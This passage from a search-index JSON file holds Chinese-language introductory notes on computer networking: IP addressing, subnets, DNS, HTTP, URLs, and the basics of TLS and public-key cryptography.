<li>\u7531\u00a08\u00a0\u4e2a\u6bb5hextet\u7ec4\u6210\uff0c\u6bcf\u4e2a\u6bb5\u00a016\u00a0\u4f4d<ul> <li>2001:da8:e000:731a:ff00:0:0:642d</li> <li>\u7406\u8bba\u4e0a\u6709\u00a0\\(2^{128}\\) \u2248 \\(3.4\u00d710^{38}\\)\u00a0\u4e2a\u4e0d\u540c\u7684\u5730\u5740</li> <li>\u6781\u5927\u5730\u7b80\u5316\u4e86\u00a0IPv4\u00a0\u5b58\u5728\u7684\u5730\u5740\u5206\u914d\u95ee\u9898</li> <li>\u8fde\u7eed\u7684\u5168\u00a00\u00a0\u6bb5\u53ef\u4ee5\u7701\u7565\uff1a2001:da8:e000:731a:ff00::642d</li> <li>\u4e5f\u6709\u00a0IPv4-mapped IPv6\u00a0\u5730\u5740\uff1a::ffff:10.78.18.216</li> <li>https://test-ipv6.com\u00a0\u6d4b\u8bd5\u4f60\u7684\u00a0IPv6\u00a0\u8fde\u63a5</li> <li>Linux\u00a0\u4e0b\u6709\u00a0ping6\u00a0\u547d\u4ee4</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_1","title":"\u5e7f\u57df\u7f51\u4e0e\u5c40\u57df\u7f51","text":"<ul> <li> <p>\u5e7f\u57df\u7f51Wide Area Network\uff1a\u8de8\u8d8a\u5927\u8303\u56f4\u7684\u7f51\u7edc\uff0c\u5982\u4e92\u8054\u7f51</p> </li> <li> <p>\u5c40\u57df\u7f51Local Area Network\uff1a\u5c0f\u8303\u56f4\u7684\u7f51\u7edc\uff0c\u5982\u5bb6\u5ead\u3001\u5b66\u6821\u3001\u516c\u53f8\u5185\u90e8\u7684\u7f51\u7edc</p> </li> <li> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5c40\u57df\u7f51\u4e4b\u95f4\u7684\u4e3b\u673a\u53ef\u4ee5\u4e92\u76f8\u8bbf\u95ee\uff0c\u4f46\u5176\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u4e92\u8054\u7f51</p> <ul> <li>\u9700\u8981\u4e00\u4e2a\u8def\u7531\u5668\u8fde\u63a5\u4e0d\u540c\u5c42\u7ea7\u7684\u7f51\u7edc</li> </ul> </li> <li> <p>\u4e00\u53f0\u4e3b\u673a\u53ef\u4ee5\u6709\u591a\u4e2a\u00a0IP\u00a0\u5730\u5740</p> <ul> <li>\u4f8b\u5982\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u7684\u4e3b\u673a\u53ef\u80fd\u6709\u591a\u4e2a\u5c40\u57df\u7f51\u00a0IP\u00a0\u548c\u516c\u7f51\u00a0IP</li> <li>\u4e00\u4e2a\u4e3b\u673a\u53ef\u4ee5\u6709\u591a\u4e2a\u7f51\u5361\uff0c\u6bcf\u4e2a\u7f51\u5361\u53ef\u4ee5\u6709\u591a\u4e2a\u00a0IP\u00a0\u5730\u5740</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_2","title":"\u56de\u73af\u5730\u5740","text":"<ul> <li>\u56de\u73af\u5730\u5740Loopback address\uff1a127.0.0.1IPv4\u00a0/\u00a0::1IPv6\u00a0/\u00a0localhost\u4e3b\u673a\u540d<ul> <li>\u7528\u4e8e\u4e3b\u673a\u81ea\u8eab\u7684\u901a\u4fe1\uff0c\u4e0d\u4f1a\u53d1\u9001\u5230\u7f51\u7edc\u4e0a</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_3","title":"\u7f51\u5173\u4e0e\u5b50\u7f51\u63a9\u7801","text":"<ul> <li>\u7f51\u5173Gateway\uff1a\u5c06\u4e0d\u540c\u7f51\u7edc\u8fde\u63a5\u8d77\u6765\u7684\u8bbe\u5907<ul> <li>\u4f8b\u5982\u8fde\u63a5\u5c40\u57df\u7f51\u548c\u4e92\u8054\u7f51\u7684\u8def\u7531\u5668</li> <li>\u4e00\u822c\u6765\u8bf4\uff0c\u5c40\u57df\u7f51\u5185\u7684\u4e3b\u673a\u7684\u7f51\u5173\u662f\u8def\u7531\u5668\u7684\u00a0IP\u00a0\u5730\u5740</li> </ul> </li> <li>\u5b50\u7f51Subnet\uff1a\u5c06\u4e00\u4e2a\u5927\u7684\u00a0IP\u00a0\u5730\u5740\u6bb5\u5212\u5206\u4e3a\u591a\u4e2a\u5c0f\u7684\u00a0IP\u00a0\u5730\u5740\u6bb5<ul> <li>\u4f8b\u5982\uff0c\u5bf9\u4e8eIP\u5730\u5740192.168.1.1\uff0c\u5982\u679c\u5b50\u7f51\u63a9\u7801\u662f255.255.255.0\uff08\u6216\u8005\u7528CIDR\u8868\u793a\u6cd5\u5199\u4f5c192.168.1.1/24\uff09\uff0c\u8fd9\u610f\u5473\u7740\u524d24\u4f4d\uff08\u5373192.168.1\uff09\u662f\u7f51\u7edc\u5730\u5740\uff0c\u5269\u4e0b\u76848\u4f4d\uff08\u5373\u6700\u540e\u4e00\u4e2a1\uff09\u662f\u4e3b\u673a\u5730\u5740\u3002</li> <li>\u5b50\u7f51\u63a9\u7801\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u00a0IP\u00a0\u5730\u5740\u662f\u5426\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u5185</li> </ul> </li> <li>NAT\uff1a\u7f51\u7edc\u5730\u5740\u8f6c\u6362<ul> <li>\u7528\u4e8e\u5c06\u5c40\u57df\u7f51\u5185\u7684\u591a\u4e2a\u4e3b\u673a\u5171\u4eab\u4e00\u4e2a\u516c\u7f51\u00a0IP\u00a0\u5730\u5740</li> <li>\u901a\u8fc7\u4fee\u6539\u00a0IP\u00a0\u6570\u636e\u5305\u7684\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u6765\u5b9e\u73b0</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#tcp-udp","title":"\u4f20\u8f93\u5c42\u534f\u8bae\u00a0TCP\u00a0\u4e0e\u00a0UDP","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#osi","title":"OSI\u00a0\u4e03\u5c42\u6a21\u578b","text":"<ul> <li>\u5e94\u7528\u5c42Application layer\uff1a\u6d4f\u89c8\u5668</li> <li>\u8868\u793a\u5c42Presentation layer</li> <li>\u4f1a\u8bdd\u5c42Session layer</li> <li>\u4f20\u8f93\u5c42Transport layer\uff1aTCP\u00a0\u548c\u00a0UDP</li> <li>\u7f51\u7edc\u5c42Network layer\uff1aIP</li> <li>\u6570\u636e\u94fe\u8def\u5c42Data link layer\uff1a\u4ee5\u592a\u7f51\u00a0/ Wi-Fi</li> <li>\u7269\u7406\u5c42Physical layer\uff1a\u7f51\u5361\u00a0/\u00a0\u8def\u7531\u5668</li> </ul> cyrus\u5bf9OSI\u603b\u7ed3\u56fe\u7247 <p>\u8be6\u7ec6\u53ef\u89c1 Cyrus' Blog\uff0c\u4e0a\u9762\u7684\u56fe\u7247\u5c31\u6765\u81ea\u4e8e\u6b64\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#tcp-udp_1","title":"TCP\u00a0\u4e0e\u00a0UDP","text":"<ul> <li>TCP\uff1a\u4f20\u8f93\u63a7\u5236\u534f\u8baeTransmission Control Protocol\uff1a\u9762\u5411\u8fde\u63a5\u7684\u534f\u8bae<ul> <li>\u901a\u8fc7\u590d\u6742\u7684\u63e1\u624b\u3001\u786e\u8ba4\u3001\u91cd\u4f20\u7b49\u673a\u5236\u4fdd\u8bc1\u6570\u636e\u7684\u987a\u5e8f\u548c\u53ef\u9760\u6027</li> </ul> </li> <li>UDP\uff1a\u7528\u6237\u6570\u636e\u62a5\u534f\u8baeUser Datagram Protocol\uff1a\u65e0\u8fde\u63a5\uff1b\"send and forget\"<ul> <li>\u66f4\u7b80\u5355\u4e14\u5feb\u901f\uff1b\u5355\u5411\u4f20\u8f93\uff0c\u4e0d\u4fdd\u8bc1\u987a\u5e8f\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u9760\u6027</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_4","title":"\u7aef\u53e3","text":"<ul> <li>\u8f6f\u4ef6\u5c42\u9762\u7684\u901a\u4fe1\u7aef\u70b9\uff0c\u4e0e\u00a0IP\u00a0\u5730\u5740\u4e00\u8d77\u6784\u6210\u7f51\u7edc\u901a\u4fe1\u7684\u57fa\u7840<ul> <li>IP\u00a0\u5730\u5740\u8bc6\u522b\u673a\u5668\uff0c\u7aef\u53e3\u53f7\u8bc6\u522b\u8f6f\u4ef6\uff08\u670d\u52a1\uff09</li> <li>TCP\u00a0\u4e0e\u00a0UDP\u00a0\u7684\u7aef\u53e3\u53f7\u662f\u5206\u5f00\u7684\uff0c\u5373\u540c\u4e00\u4e2a\u7aef\u53e3\u53f7\u53ef\u4ee5\u540c\u65f6\u7528\u4e8e\u00a0TCP\u00a0\u548c\u00a0UDP</li> <li>\u53ef\u4ee5\u8bbe\u7f6e\u53ea\u76d1\u542c\uff08bind\uff09\u67d0\u4e2a\u00a0IP\u00a0\u5730\u5740\u7684\u67d0\u4e2a\u7aef\u53e3\u53f7</li> </ul> </li> <li>\u7aef\u53e3\u53f7\u7684\u8303\u56f4\u662f\u00a00~65535<ul> <li>\u5176\u4e2d\u00a00~1023\u00a0\u4e3a\u7cfb\u7edf\u4fdd\u7559\u7aef\u53e3\uff0c\u4e00\u822c\u4e0d\u7528\u4e8e\u901a\u7528\u670d\u52a1</li> </ul> </li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e0d\u540c\u7684\u8f6f\u4ef6\u4f7f\u7528\u4e0d\u540c\u7684\u7aef\u53e3\u53f7<ul> <li>\u901a\u8fc7\u7aef\u53e3\u53f7\u53ef\u4ee5\u533a\u5206\u4e0d\u540c\u7684\u670d\u52a1\uff0c\u4f8b\u5982\u00a0HTTP\u00a0\u7684\u5206\u914d\u7aef\u53e3\u662f\u00a0TCP 80<ul> <li>\u5373\u00a0http://10.78.18.216\u00a0\u5c31\u662f\u00a0http://10.78.18.216:80</li> <li>\u5426\u5219\u9700\u8981\u5199\u660e\u7aef\u53e3\u53f7\uff0c\u5982\u00a0http://10.78.18.216:39200</li> </ul> </li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#dns","title":"\u57df\u540d\u7cfb\u7edf\u4e0e\u00a0DNS","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_5","title":"\u57df\u540d","text":"<ul> <li>\u57df\u540dDomain Name\u7528\u4e8e\u6807\u8bc6\u4e92\u8054\u7f51\u4e0a\u7684\u8ba1\u7b97\u673a<ul> <li>\u7531\u4e00\u4e32\u7528\u00a0.\u00a0\u5206\u9694\u7684\u5b57\u7b26\u4e32\u7ec4\u6210\uff0c\u4f8b\u5982\u00a0example.com</li> <li>\u6700\u53f3\u4fa7\u7684\u90e8\u5206\u79f0\u4e3a\u9876\u7ea7\u57df\u540dTop-Level Domain\uff1a.com .net .org .cn\u00a0\u7b49</li> <li>\u4ece\u53f3\u81f3\u5de6\u4f9d\u6b21\u4e3a\u4e8c\u7ea7\u3001\u4e09\u7ea7\u57df\u540d\u7b49\uff1awww.example.com</li> </ul> </li> <li>\u5982\u4f55\u62e5\u6709\u4e00\u4e2a\u57df\u540d\uff1f<ul> <li>\u5728\u57df\u540d\u6ce8\u518c\u5546\u5904\u8d2d\u4e70\uff0c\u5982\u963f\u91cc\u4e91\u3001\u817e\u8baf\u4e91\u3001Cloudflare\u00a0\u7b49</li> <li>\u6839\u636e\u57df\u540d\u7684\u00a0TLD\u3001\u957f\u5ea6\u7b49\u56e0\u7d20\uff0c\u4ef7\u683c\u4ece\u51e0\u5143\u5230\u51e0\u5343\u5143\u4e0d\u7b49\uff08\u6bcf\u5e74\uff09</li> </ul> </li> <li>\u62e5\u6709\u4e00\u4e2a\u57df\u540d\u610f\u5473\u7740\u62e5\u6709\u5728\u4e92\u8054\u7f51\u4e0a\u7684\u4e00\u4e2a\u8eab\u4efd<ul> <li>\u57df\u540d\u5e76\u4e0d\u662f\u53ea\u80fd\u7528\u4e8e\u7f51\u7ad9\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5f88\u591a\u5176\u4ed6\u7528\u9014\uff0c\u5982\u90ae\u7bb1</li> <li>\u53ef\u4ee5\u8bbe\u7f6e\u4efb\u610f\u591a\u7684\u5b50\u57df\u540d\uff0c\u5982\u00a0blog.example.com\u00a0\u7b49</li> </ul> </li> <li>\u53ea\u62e5\u6709\u4e00\u4e2a\u57df\u540d\u662f\u4e0d\u591f\u7684\uff01<ul> <li>\u8fd8\u9700\u8981\u6709\u4e1c\u897f\u53ef\u4ee5\u8bbf\u95ee\uff08\u4e00\u4e2a\u670d\u52a1\u5668\uff09</li> </ul> </li> </ul> <p>[!DEFINITION ]</p> <p>DNS\uff08Domain Name System\uff0c\u57df\u540d\u7cfb\u7edf\uff09\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u7684\u547d\u540d\u7cfb\u7edf\uff0c\u4e3b\u8981\u7528\u4e8e\u5c06\u4eba\u7c7b\u53ef\u8bfb\u7684\u57df\u540d\uff08\u5982 www.example.com \uff09\u8f6c\u6362\u4e3a\u673a\u5668\u53ef\u8bfb\u7684IP\u5730\u5740\u3002DNS\u662f\u4e92\u8054\u7f51\u7684\u4e00\u4e2a\u5173\u952e\u7ec4\u4ef6\uff0c\u56e0\u4e3a\u5b83\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u800c\u4e0d\u662fIP\u5730\u5740\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#dns_1","title":"DNS\u7684\u5de5\u4f5c\u539f\u7406\uff1a","text":"<ol> <li> <p>\u57df\u540d\u89e3\u6790\u8bf7\u6c42\uff1a</p> <ul> <li>\u5f53\u4f60\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\u4e00\u4e2a\u7f51\u5740\uff08\u4f8b\u5982 www.example.com\uff09\u65f6\uff0c\u4f60\u7684\u8ba1\u7b97\u673a\u4f1a\u9996\u5148\u68c0\u67e5\u672c\u5730\u7f13\u5b58\u4e2d\u662f\u5426\u6709\u8be5\u57df\u540d\u7684IP\u5730\u5740\u8bb0\u5f55\u3002</li> <li>\u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u8ba1\u7b97\u673a\u4f1a\u5411\u4f60\u7684\u7f51\u7edc\u914d\u7f6e\u4e2d\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2aDNS\u67e5\u8be2\u8bf7\u6c42\u3002</li> </ul> </li> <li> <p>\u9012\u5f52\u67e5\u8be2\uff1a</p> <ul> <li>\u4f60\u7684DNS\u670d\u52a1\u5668\uff08\u901a\u5e38\u662f\u4f60\u7684\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546\u63d0\u4f9b\u7684\uff09\u4f1a\u5c1d\u8bd5\u4ece\u5176\u7f13\u5b58\u4e2d\u627e\u5230\u7b54\u6848\u3002\u5982\u679c\u5b83\u6ca1\u6709\u627e\u5230\uff0c\u5b83\u5c06\u4ee3\u8868\u4f60\u7684\u8ba1\u7b97\u673a\u8fdb\u884c\u9012\u5f52\u67e5\u8be2\u3002</li> <li>\u8fd9\u610f\u5473\u7740\u5b83\u4f1a\u4e0e\u5176\u4ed6DNS\u670d\u52a1\u5668\u901a\u4fe1\uff0c\u76f4\u5230\u627e\u5230\u5305\u542b\u6240\u9700\u4fe1\u606f\u7684DNS\u670d\u52a1\u5668\u3002</li> </ul> </li> <li> <p>DNS\u8bb0\u5f55\uff1a</p> <ul> <li>DNS\u670d\u52a1\u5668\u4e4b\u95f4\u901a\u8fc7\u67e5\u8be2\u4e0d\u540c\u7684DNS\u8bb0\u5f55\u6765\u627e\u5230\u7b54\u6848\u3002\u6700\u5e38\u89c1\u7684\u8bb0\u5f55\u7c7b\u578b\u5305\u62ec\uff1a<ul> <li>A\u8bb0\u5f55\uff1a\u5c06\u57df\u540d\u6620\u5c04\u5230IPv4\u5730\u5740\u3002</li> <li>AAAA\u8bb0\u5f55\uff1a\u5c06\u57df\u540d\u6620\u5c04\u5230IPv6\u5730\u5740\u3002</li> <li>CNAME\u8bb0\u5f55\uff1a\u5c06\u4e00\u4e2a\u57df\u540d\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u57df\u540d\uff08\u5e38\u7528\u4e8e\u5b50\u57df\u540d\uff09\u3002</li> <li>MX\u8bb0\u5f55\uff1a\u6307\u5b9a\u63a5\u6536\u7535\u5b50\u90ae\u4ef6\u7684\u90ae\u4ef6\u670d\u52a1\u5668\u3002</li> <li>NS\u8bb0\u5f55\uff1a\u6307\u5b9a\u8d1f\u8d23\u4e00\u4e2a\u57df\u7684DNS\u670d\u52a1\u5668\u3002</li> <li>TXT\u8bb0\u5f55\uff1a\u7528\u4e8e\u5404\u79cd\u9a8c\u8bc1\u548c\u914d\u7f6e\uff0c\u5982SPF\u8bb0\u5f55\u3002</li> </ul> </li> </ul> </li> <li> <p>\u54cd\u5e94\u67e5\u8be2\uff1a</p> <ul> <li>\u4e00\u65e6\u627e\u5230\u7b54\u6848\uff0cDNS\u670d\u52a1\u5668\u4f1a\u5c06IP\u5730\u5740\u8fd4\u56de\u7ed9\u4f60\u7684\u8ba1\u7b97\u673a\u3002</li> <li>\u4f60\u7684\u8ba1\u7b97\u673a\u5c06\u8fd9\u4e2aIP\u5730\u5740\u5b58\u50a8\u5728\u672c\u5730\u7f13\u5b58\u4e2d\uff0c\u4ee5\u4fbf\u5728\u5c06\u6765\u7684\u67e5\u8be2\u4e2d\u4f7f\u7528\u3002</li> </ul> </li> <li> <p>\u6d4f\u89c8\u5668\u8fde\u63a5\uff1a</p> <ul> <li>\u5f97\u5230IP\u5730\u5740\u540e\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5730\u5740\u6765\u5efa\u7acb\u4e0e\u76ee\u6807\u7f51\u7ad9\u7684\u8fde\u63a5\u3002</li> </ul> </li> </ol>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#http","title":"\u5e94\u7528\u5c42\u534f\u8bae\u00a0HTTP","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#http_1","title":"HTTP\u00a0\u534f\u8bae","text":"<ul> <li>\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8baeHyperText Transfer Protocol</li> <li>\u662f\u57fa\u4e8e\u6587\u672c\u7684\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u7f51\u9875</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#-cs","title":"\u5ba2\u6237\u7aef\u00a0-\u00a0\u670d\u52a1\u5668\uff08C/S\uff09\u67b6\u6784","text":"<ul> <li>\u4efb\u4f55\u4e00\u53f0\u8ba1\u7b97\u673a\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u670d\u52a1\u5668</li> <li>\u53d1\u8d77\u8fde\u63a5\u7684\u8282\u70b9\u662f\u5ba2\u6237\u7aef\uff0c\u63a5\u53d7\u8fde\u63a5\u7684\u8282\u70b9\u662f\u670d\u52a1\u5668<ul> <li>\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u662f\u5bf9\u7b49\u7684</li> <li>\u670d\u52a1\u5668\u4e0d\u80fd\u4e3b\u52a8\u53d1\u8d77\u8fde\u63a5\uff0c\u53ea\u80fd\u7b49\u5f85\u5ba2\u6237\u7aef\u7684\u8fde\u63a5</li> </ul> </li> <li>\u670d\u52a1\u5668\u4e0d\u4e00\u5b9a\u53ea\u80fd\u5904\u7406\u00a0HTTP\u00a0\u8bf7\u6c42<ul> <li>\u5982\u00a0DNS\u00a0\u670d\u52a1\u5668</li> </ul> </li> <li>\u670d\u52a1\u5668\u53ef\u4ee5\u540c\u65f6\u5904\u7406\u591a\u4e2a\u5ba2\u6237\u7aef\u7684\u8fde\u63a5<ul> <li>\u5ba2\u6237\u7aef\u5728\u672c\u5730\u9009\u53d6\u4e00\u4e2a\u7a7a\u95f2\u7684\u9ad8\u7aef\u53e3\u53f7\uff0c\u8fde\u63a5\u5230\u670d\u52a1\u5668\u7684\u00a080\u00a0\u7aef\u53e3</li> <li>client:49152 &lt;-&gt; server:80</li> </ul> </li> <li>DoS\u00a0\u653b\u51fb\uff1a\u901a\u8fc7\u5927\u91cf\u7684\u65e0\u6548\u8bf7\u6c42\u5360\u7528\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u4f7f\u5f97\u5408\u6cd5\u8bf7\u6c42\u65e0\u6cd5\u88ab\u5904\u7406<ul> <li>DDoS\u00a0\u653b\u51fb\uff1a\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#url","title":"URL\uff1a\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26","text":"<p>[ ](https://slides.tonycrane.cc/PracticalSkillsTutorial/2023-fall-ckc/lec6/lec6/URI_syntax_diagram.svg.avif) <ul> <li>URI\uff08\u7edf\u4e00\u8d44\u6e90\u6807\u8bc6\u7b26\uff09\u7684\u4e00\u79cd\uff0c\u7528\u4e8e\u5b9a\u4f4d\u4e92\u8054\u7f51\u4e0a\u7684\u8d44\u6e90<ul> <li>\u683c\u5f0f\u5982\u4e0a\u56fe\uff0c\u91cd\u8981\u6027\u7531\u5de6\u81f3\u53f3\u9012\u51cf</li> </ul> </li> </ul> <pre><code>https://www.example.com:443/path/to/resource?query=1#frag\n</code></pre> <ul> <li>\u534f\u8bae\uff1ahttps</li> <li>\u4e3b\u673a\uff1awww.example.com</li> <li>\u7aef\u53e3\uff1a443</li> <li>\u8def\u5f84\uff1a/path/to/resource</li> <li>\u67e5\u8be2\uff1aquery=1</li> <li>\u7247\u6bb5\uff1afrag</li> <li>URL\u00a0\u4e2d\u53ea\u80fd\u5305\u542b\u00a0ASCII\u00a0\u5b57\u7b26\uff0c\u7531\u767e\u5206\u53f7\u7f16\u7801\u5b9a\u4e49\u7684\u5b57\u7b26\u96c6<ul> <li>\u4f8b\u5982\u7a7a\u683c\u7f16\u7801\u4e3a\u00a0%20\uff0c\u6216\u6709\u4e9b\u60c5\u51b5\u4e0b\u7f16\u7801\u4e3a\u00a0+</li> <li>https://www.google.com/search?q=what+is+a+url%3F</li> <li>Percent-encoding - MDN Web Docs</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_6","title":"\u8bf7\u6c42\u65b9\u6cd5","text":"<ul> <li>HTTP\u00a0\u8bf7\u6c42\u65b9\u6cd5\u00a0- MDN Web Docs</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#tls","title":"TLS\u00a0\u4e0e\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#http-https","title":"HTTP\u00a0\u4e0e\u00a0HTTPS","text":"<ul> <li>HTTP\u00a0\u7684\u4e00\u5207\u90fd\u662f\u660e\u6587\u4f20\u8f93<ul> <li>\u4e24\u4e2a\u8282\u70b9\u95f4\u7684\u4efb\u4f55\u4e00\u4e2a\u4e2d\u95f4\u8282\u70b9\u90fd\u53ef\u4ee5\u7a83\u542c\u5e76\u5e72\u9884/\u4fee\u6539\u901a\u4fe1\u5185\u5bb9</li> </ul> </li> <li>HTTPS\uff1aHTTP over TLS<ul> <li>\u4f20\u8f93\u5c42\u5b89\u5168\u534f\u8baeTransport Layer Security\uff0c\u65e7\u79f0\u5b89\u5168\u5957\u63a5\u5c42Secure Sockets Layer</li> <li>\u4e0d\u53ea\u662f\u00a0HTTP\uff0c\u4efb\u4f55\u5e94\u7528\u5c42\u534f\u8bae\u90fd\u53ef\u4ee5\u900f\u660e\u5730\u4f7f\u7528\u00a0TLS</li> <li>\u901a\u8fc7\u52a0\u5bc6\u3001\u8ba4\u8bc1\u548c\u5b8c\u6574\u6027\u4fdd\u62a4\u6765\u4fdd\u62a4\u901a\u4fe1\u5185\u5bb9</li> <li>The Illustrated TLS Connection: Every Byte Explained</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_7","title":"\u901a\u4fe1\u5b89\u5168","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_8","title":"\u5bf9\u79f0\u52a0\u5bc6","text":"<ul> <li>\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff1a\u5982\u00a0AES\u3001ChaCha20\u00a0\u7b49<ul> <li>Alice\u00a0\u548c\u00a0Bob\u00a0\u5982\u4f55\u786e\u4fdd\u4ed6\u4eec\u7684\u6d88\u606f\u662f\u5b89\u5168\u7684\uff1f</li> <li>Alice\u00a0\u7528\u5bc6\u94a5\u00a0K\u00a0\u52a0\u5bc6\u6d88\u606f\u00a0M\uff0c\u5f97\u5230\u00a0C\uff0c\u53d1\u9001\u7ed9\u00a0Bob</li> <li>Bob\u00a0\u7528\u5bc6\u94a5\u00a0K\u00a0\u89e3\u5bc6\u00a0C\uff0c\u5f97\u5230\u00a0M</li> <li>\u4f46\u4e24\u4eba\u5982\u4f55\u534f\u5546\u5bc6\u94a5\u00a0K\uff1f<ul> <li>\u901a\u8fc7\u7ebf\u4e0b\u89c1\u9762\u4ea4\u6362\u00a0K\uff1f</li> <li>\u968f\u00a0C\u00a0\u4e00\u8d77\u53d1\u9001\u00a0K\uff1f<ul> <li>\u4efb\u4f55\u62ff\u5230\u00a0K\u00a0\u7684\u4eba\u90fd\u53ef\u4ee5\u7528\u5176\u89e3\u5bc6\u00a0C</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_9","title":"\u975e\u5bf9\u79f0\u52a0\u5bc6","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#diffie-hellman","title":"\u73b0\u4ee3\u5bc6\u7801\u5b66\uff1aDiffie-Hellman\u00a0\u5bc6\u94a5\u4ea4\u6362","text":"<ul> <li>1976\u00a0\u5e74\u53d1\u660e\uff0c\u516c\u94a5\u5bc6\u7801\u5b66\u7684\u57fa\u7840</li> <li>\u57fa\u4e8e\u6570\u5b66\u5047\u8bbe\uff1a\u79bb\u6563\u5bf9\u6570\u95ee\u9898\uff08DLP\uff09\u662f\u56f0\u96be\u7684</li> <li>Alice\u00a0\u548c\u00a0Bob\u00a0\u5982\u4f55\u786e\u4fdd\u4ed6\u4eec\u7684\u901a\u4fe1\u80fd\u591f\u4fdd\u5bc6\uff1f<ul> <li>\u8bbe\u00a0Alice\u00a0\u7684\u79d8\u5bc6\u503c\u00a0\ud835\udc4ea\uff0cBob\u00a0\u7684\u79d8\u5bc6\u503c\u00a0\ud835\udc4fb</li> <li>\u4e24\u4eba\u4e8b\u524d\u7ea6\u5b9a\u4e24\u4e2a\u516c\u5f00\u53c2\u6570\u00a0\ud835\udc5dp\u00a0\u548c\u00a0\ud835\udc54g\uff0c\u6240\u6709\u8fd0\u7b97\u90fd\u5728\u6a21\u00a0\ud835\udc5dp\u00a0\u7fa4\u4e0a\u8fdb\u884c</li> <li>Alice\u00a0\u8ba1\u7b97\u00a0\ud835\udc54\ud835\udc4ega\uff0cBob\u00a0\u8ba1\u7b97\u00a0\ud835\udc54\ud835\udc4fgb</li> <li>\u4e24\u4eba\u901a\u8fc7\u516c\u5f00\u4fe1\u9053\u4ea4\u6362\u00a0\ud835\udc54\ud835\udc4ega\u00a0\u548c\u00a0\ud835\udc54\ud835\udc4fgb\uff0c\u5728\u8fd9\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u7a83\u542c\u8005\u00a0Eve</li> <li>Alice\u00a0\u8ba1\u7b97\u00a0(\ud835\udc54\ud835\udc4f)\ud835\udc4e(gb)a\uff0cBob\u00a0\u8ba1\u7b97\u00a0(\ud835\udc54\ud835\udc4e)\ud835\udc4f(ga)b</li> <li>Eve\u00a0\u53ef\u80fd\u7a83\u542c\u5230\u00a0\ud835\udc54\ud835\udc4ega\u00a0\u548c\u00a0\ud835\udc54\ud835\udc4fgb\uff0c\u5979\u4e5f\u77e5\u9053\u00a0\ud835\udc5dp\u00a0\u548c\u00a0\ud835\udc54g\uff0c\u5982\u4f55\u6c42\u89e3\u00a0\ud835\udc54\ud835\udc4e\ud835\udc4fgab\uff1f<ul> <li>\u5982\u679c\u00a0\ud835\udc5dp\u00a0\u548c\u00a0\ud835\udc54g\u00a0\u5f88\u5927\uff1f</li> </ul> </li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#rsa-ecc","title":"RSA\u00a0\u4e0e\u00a0ECC","text":"<ul> <li>RSA\u00a0\u516c\u94a5\u5bc6\u7801\u5b66<ul> <li>\u57fa\u4e8e\u6570\u5b66\u5047\u8bbe\uff1a\u5927\u6574\u6570\u7684\u56e0\u6570\u5206\u89e3\u662f\u56f0\u96be\u7684</li> 